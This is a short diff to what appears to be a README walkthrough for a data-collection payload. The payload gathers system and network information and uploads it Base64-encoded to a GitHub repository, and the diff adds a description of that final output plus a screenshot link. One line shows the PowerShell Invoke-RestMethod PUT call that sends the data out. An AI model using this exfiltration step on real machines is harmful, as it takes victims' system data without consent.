@@ -90,7 +90,16 @@ The payload uploads the Base64-encoded log file to your GitHub repository using 
 `Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -Body $body <br/>`
 
 <img src="https://i.imgur.com/gdZPiBi.png" height="80%" width="80%" alt="Payload Walkthrough"/>
+<br />
+<p align="center">
+GitHub Log File Upload Final Output:
+ 
+The image below shows the end result of the payload script. After execution, the collected system and network information is uploaded to the GitHub repository in a `.txt` file. The values are encoded and stored using the GitHub REST API.
+
+<img src="https://i.imgur.com/eO7aJ8d.png" height="80%" width="80%" alt="Payload Walkthrough"/>
 </p>
+
+
 
 <!--
  ```diff
